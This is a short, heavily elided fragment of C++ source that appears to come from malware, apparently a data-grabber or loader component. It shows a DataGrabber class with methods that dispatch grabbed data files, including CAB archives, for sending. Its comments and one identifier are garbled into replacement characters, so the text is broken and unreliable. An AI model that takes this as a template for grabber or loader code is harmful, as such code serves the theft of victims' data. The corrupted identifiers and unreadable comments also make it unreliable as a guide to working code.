...
#ifdef GrabbersH
        TGrabberFileSender GrabberFiles; // ����� ������ �������
#endif
...
bool DataGrabber::SendDataFile(PCHAR FileName, bool* InvalidFile)
{
	...
	switch (File->Head.Flags)
	{
        ...
        case DATA_TYPE_CAB:    Result = Send�abFromDataFile(File, InvalidFile); break;
	default: LDBG("Loader", "����������� ��� ������");;
	}
...
bool DataGrabber::Send�abFromDataFile(PDataFile File, bool* InvalidFile)
{
	// ����� ��������� ���������� �������� CAB ������
